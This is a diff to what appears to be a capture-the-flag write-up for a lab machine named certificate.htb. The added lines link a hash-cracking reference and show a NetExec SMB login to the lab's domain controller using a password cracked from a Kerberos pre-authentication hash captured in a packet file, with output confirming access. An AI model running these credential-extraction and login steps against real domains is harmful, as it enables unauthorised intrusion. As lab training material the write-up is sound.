@@ -474,6 +474,8 @@ Ill filter for kerberos
 
 https://medium.com/@liram.cybersec/from-packets-to-passwords-utilizing-pcap-file-data-for-domain-access-5c206e64566b
 
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
 The third packet in the list is the most interesting
 
 ![](Pasted%20image%2020261105180341.png)
@@ -503,6 +505,14 @@ $krb5pa$18$Lion.SK$certificate.htb$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a437
 ```
 
 The hash cracked!
+
+# Compromising `lion.sk`
+
+```python
+❯❯❯ nxc smb dc01.certificate.htb -u lion.sk -p '!QAZ2wsx' 
+SMB         10.129.245.51   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.245.51   445    DC01             [+] certificate.htb\lion.sk:!QAZ2wsx
+```
 
 
 
